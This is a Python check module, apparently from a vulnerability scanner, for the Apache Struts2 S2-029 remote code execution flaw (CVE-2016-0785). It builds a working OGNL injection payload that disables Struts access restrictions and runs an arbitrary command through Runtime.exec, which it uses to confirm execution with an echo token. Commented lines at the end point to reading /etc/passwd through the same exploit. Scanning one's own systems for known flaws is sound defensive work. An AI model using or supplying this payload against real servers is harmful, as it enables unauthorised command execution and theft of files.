#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_029_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2016-0785',
            'description': 'Struts2 S2-029漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.24.1 (2.3.20.3除外)',
            'date': '2016-03-10',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.payload = '''?message=(%23_memberAccess%5B'allowPrivateAccess'%5D=true,%23_memberAccess%5B'allowProtectedAccess'%5D=true,%23_memberAccess%5B'excludedPackageNamePatterns'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'excludedClasses'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'allowPackageProtectedAccess'%5D=true,%23_memberAccess%5B'allowStaticMethodAccess'%5D=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{cmd}').getInputStream()))'''
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_req = await request.get(self.url + self.payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
            check_req_text = await check_req.text()
            check_req_text = check_req_text.replace('\n', '')
            check_req_text = check_req_text.replace(' ', '')
            check_result = re.findall('<input.*?value="(.*?)".*?/>', check_req_text)
            if self.capta in check_result:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_029 = S2_029_BaseVerify('http://127.0.0.1:8080/S2-029/default.action')
    # print(S2_029.cmd('cat /etc/passwd'))
    # print(S2_029.read('/etc/passwd'))
    